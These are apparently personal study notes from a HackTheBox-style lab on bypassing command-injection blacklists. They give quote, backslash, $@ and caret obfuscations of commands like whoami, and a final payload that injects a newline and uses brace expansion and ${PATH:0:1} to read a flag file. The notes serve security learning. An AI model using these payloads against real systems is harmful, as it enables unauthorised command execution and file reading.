---
title: Bypass Blacklisted Commands
draft: false
tags:
---
Blacklisting commands work like below's code:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

We can utilize various obfuscation techniques that will execute our command without using the exact command word.

## Linux and Windows

One common way is to insert a certain character within our command that is usually ignored by command shells like Bash or PowerShell.

`'` and `"` are sometimes just ignored.

e.g

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

> Number of quotes always has to be even.


## Linux Only

We can insert few other Linux-only characters in the middle of commands and the bash shell would ignore them and execute the command.

`\` and `$@` is often used for this purpose.

e.g

```bash
who$@ami
w\ho\am\i
```

## Windows Only

We can insert `^` character between command as such:

```cmd-session
C:\htb> who^ami

21y4d
```



To read a file I can use something like:

```
127.0.0.1%0a{ca't',${PATH:0:1}home${PATH:0:1}user1${PATH:0:1}flag.txt}
```